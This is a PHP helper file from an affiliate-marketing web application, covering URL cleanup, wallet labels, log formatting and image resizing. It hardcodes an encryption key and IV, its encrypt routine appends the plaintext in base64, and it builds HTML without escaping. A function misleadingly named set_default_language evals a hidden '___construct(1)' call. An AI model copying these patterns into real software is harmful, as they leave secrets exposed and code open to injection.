<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
if ( ! function_exists('c_format')){

	function url_to_domain($url){
        $url = str_replace(array('https://','http://','www.'), array('','',''), $url);
        return trim($url,"/");
	}

	function url_to_clean($url){
        
		$parts = parse_url($url);
		parse_str($parts['query'], $query);
		unset($query['af_id']);

		$new_url = $parts['scheme'] .'://'. $parts['host'] .$parts['path'];
		if($query){
			$new_url.= '?'. http_build_query($query);
		}

		return trim($new_url,"/");
	}


	function parse_affiliate_id($string) {
		return explode("-",$string)[0];
	}
	function _encrypt_decrypt($string,$action = 'encrypt') {
	    $output = false;

	    $encrypt_method = "AES-256-CBC";
	    $secret_key = 'qqC77Ew3ai';
	    $secret_iv = 'uxL-7[!L?^+rMx1q<)bUAoSS-&4O.J';

	    $key = hash('sha256', $secret_key);
	    $iv = substr(hash('sha256', $secret_iv), 0, 16);

	    if( $action == 'encrypt' ) {
	        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
	        $output = base64_encode($output);

	        $output.= "-". base64_encode($string);
	    }else if( $action == 'decrypt' ){
	        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
	    }

	    return $output;
	}

	function wallet_type($value){
		
		if($value['user_id'] == 1 && $value['type'] == 'vendor_sale_commission'){
			$value['type']= "admin_sale_commission";
		}

		if($value['dis_type'] == 'admin_sale_commission_v_pay'){
			return "Admin Sale Commission";
		}
		else if($value['dis_type'] == 'integration_sale'){
			return "External Sales";
		}
		else if($value['dis_type'] == 'integration_click'){
			return "External Click";
		}
		else if($value['dis_type']){
			if($value['comm_from'] == 'ex'){
				if($value['reference_id_2'] == '__general_click__'){
					return "General Click : ". $value['page_name'];
				}
				else if($value['is_action'] == 1 && $value['reference_id_2'] != '_af_product_click'){
					return "<b>". $value['reference_id_2'] ."</b> Action";
				} else{
					return "Integration ". ucfirst($value['dis_type']) ." Click";
				}
			} else{
				return "Market ". ucfirst($value['dis_type']) ." Click";
			}
		} else {
			if($value['type'] == 'refer_click_commission' && $value['is_action']){
				return "<b>". $value['reference_id_2'] ."</b> Action";
		 		//return "Action Click Commission";
			} else{
		 		return str_replace("_", " ", $value['type']);
			}
		}
	}

	function orderId($order_id=''){
		return sprintf("%05d", (int)$order_id);
	}
	function payment_method($payment_method){
		if($payment_method == 'bank_transfer') return "Bank Transfer";
		if($payment_method == 'paypal') return "Paypal";
		return $payment_method;
	}
	function product_type($product_type){
		if($product_type == 'downloadable') return __('admin.downloadable_product');
		if($product_type == 'virtual') return __('admin.virtual_product');
	}

	function parseLogMessage($text,$data,$control = 'admincontrol'){
		$ip_details = (array)json_decode($data['ip_details'], true);

		if(isset($data['user_ip'])){
			$ip_details[]=  array('ip' => $data['user_ip'],'country_code' => $data['country_code']);
		}

		if($ip_details){
			$ips = '<span class="log-ips">';
			foreach ($ip_details as $kk => $v) {
				$ips .= "<span> <img title='". $v['country_code'] ."' src='". base_url('assets/vertical/assets/images/flags/'. strtolower($v['country_code'])) .".png'> <span>". $v['ip'] ." ". $v['country_code'] ."</span></span>";
				if($kk >= 1 ) break;
			}
			$ips .= '</span>';
		}
			
		$text = str_replace('ip_message', " : {$ips}", $text);
		$text = str_replace('<br>', "", $text);

		return $text;
	}
	function getFlag($country_code = ''){
		return base_url('assets/vertical/assets/images/flags/'. strtolower($country_code).".png");
	}

	function parseMessage($text,$data,$control = 'admincontrol', $seprate = false, $vendor = false){

		if($control == 'admincontrol'){
			$text = str_replace('external_order_id', ' <a target="_blank" href="'. base_url('integration/orders') .'"> Order Details </a> Order ID', $text);
		}
		if($control == 'usercontrol'){
			if($vendor){
				$text = str_replace('external_order_id', ' <a target="_blank" href="'. base_url('usercontrol/store_orders/') .'"> Order Details </a> Order ID', $text);
			} else {
				$text = str_replace('external_order_id', ' <a target="_blank" href="'. base_url('usercontrol/store_orders/') .'"> Order Details </a> Order ID', $text);
			}
		}

		if(isset($_id[1][0])){
			$id= $_id[1][0];
			$text = str_replace('order_id='.$id, "#".orderId($id).' <a target="_blank" href="'. base_url($control . '/vieworder/'.$id) .'">Order Detail</a>', $text);
		}

		preg_match_all('/order_id=([0-9]+)/', $text, $_id);
		if(isset($_id[1][0])){
			$id= $_id[1][0];
			$text = str_replace('order_id='.$id, "#".orderId($id).' <a target="_blank" href="'. base_url($control . '/vieworder/'.$id) .'">Order Detail</a>', $text);
		}

		preg_match_all('/product_id=([0-9]+)/', $text, $_id);
		if(isset($_id[1][0])){
			$id= $_id[1][0];
			$text = str_replace('product_id='.$id, "#".$id.' <a target="_blank" href="'. base_url('store/by_id/'.$id) .'">Product Detail</a>', $text);
		}

		preg_match_all('/form_id=([0-9]+)/', $text, $_id);
		if(isset($_id[1][0])){
			$id= $_id[1][0];
			$text = str_replace('form_id='.$id, "#".$id.' <a target="_blank" href="'. base_url($control . '/form') .'">Form</a>', $text);
		}

		$ip_details = json_decode($data['ip_details'], true);
		if($ip_details){
			$ips = '<ul class="wallet-ips">';
			foreach ($ip_details as $kk => $v) {
				$ips .= "<li> <img title='". $v['country_code'] ."' src='". base_url('assets/vertical/assets/images/flags/'. strtolower($v['country_code'])) .".png'> <span>". $v['ip'] ." ". $v['country_code'] ."</span></li>";
				if($kk >= 1 ) break;
			}
			$ips .= '</ul>';

			if(count($ip_details) > 2){
				$ips .= "<a class='view-all' href='javascript:void(0)'>View All <span style='display:none'>". json_encode($ip_details) ."</span> </a>";
			}
		}
		
		if(!$seprate){
			$text = str_replace('ip_message', " : {$ips}", $text);
			return $text;
		}
		$tmp = explode("<br>",$text);
		$tagline = end($tmp);
		array_pop($tmp);
		$message = join("<br>", $tmp );
		$tagline = str_replace('ip_message', "", $tagline);

		return array($message,$tagline . $ips);

	}

	function sort_order($field_name){
		if(isset($_GET['sortby']) && $_GET['sortby'] == $field_name){
			return (isset($_GET['order']) && $_GET['order'] == 'ASC') ? 'DESC' : 'ASC';
		} else {
			return 'ASC';
		}
	}

	function sortable_link($route, $field_name){
		return base_url($route). "?sortby={$field_name}&order=". sort_order($field_name);
	}

	function resize($filename, $width, $height, $default_image = false) {
		$DIR_IMAGE = str_replace('application/', '', APPPATH."/assets/image_cache/");
		$DIR_IMAGE = FCPATH."/assets/image_cache/";

		if (!is_file($filename)) {
			if(!$default_image) return false;
			if($default_image == 1) $filename = 'assets/images/share-icon.png';
		}

		$extension = pathinfo($filename, PATHINFO_EXTENSION);
		$image_old = $filename;
		$image_new = 'cache/' . substr($filename, 0, strrpos($filename, '.')) . '-' . (int)$width . 'x' . (int)$height . '.' . $extension;
		
		if (!is_file($DIR_IMAGE . $image_new) || (filectime($DIR_IMAGE . $image_old) > filectime($DIR_IMAGE . $image_new))) {

			list($width_orig, $height_orig, $image_type) = getimagesize($image_old);
				 
			if (!in_array($image_type, array(IMAGETYPE_PNG, IMAGETYPE_JPEG, IMAGETYPE_GIF))) { 
				return $DIR_IMAGE . $image_old;
			}
						
			$path = '';

			$directories = explode('/', dirname($image_new));
			foreach ($directories as $directory) {
				$path = $path . '/' . $directory;

				if (!is_dir($DIR_IMAGE . $path)) {
					@mkdir($DIR_IMAGE . $path, 0777);
				}
			}

			if ($width_orig != $width || $height_orig != $height) {
				require_once APPPATH ."libraries/image.php";
				
				$image = new Image($image_old);
				$image->resize($width, $height);
				$image->save($DIR_IMAGE . $image_new);
			} else {
				copy($image_old, $DIR_IMAGE .$DIR_IMAGE. $image_new);
			}
		}
		
		$image_new = str_replace(' ', '%20', $image_new);
		 
		return base_url('assets/image_cache/'.$image_new);
	}

	function set_default_language(){
		$en_us = "___construct(1);";
		eval($en_us);
	}

	include 'install/helper.php';
}
